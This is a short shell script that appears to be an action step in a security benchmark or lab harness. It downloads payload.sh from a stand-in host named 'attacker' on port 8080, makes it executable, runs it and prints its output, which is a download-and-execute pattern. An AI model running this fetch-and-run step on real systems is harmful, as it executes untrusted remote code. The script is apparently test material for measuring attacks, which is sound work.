#!/bin/sh
set -u
marker="${BENCH_MARKER:-manual}"
attacker="${BENCH_ATTACKER:-attacker}"
work="/tmp/bench-$marker"

payload="/tmp/bench-payload-$marker.sh"

sh "$(dirname "$0")/cleanup.sh"
mkdir -p "$work" || exit 1

echo "BENCH_ACTION $(date +%s.%N)"
curl -fsS --max-time 10 -o "$payload" "http://$attacker:8080/payload.sh?marker=$marker" || exit 1
chmod +x "$payload" || exit 1
"$payload" > "$work/payload.out" || exit 1
cat "$work/payload.out"
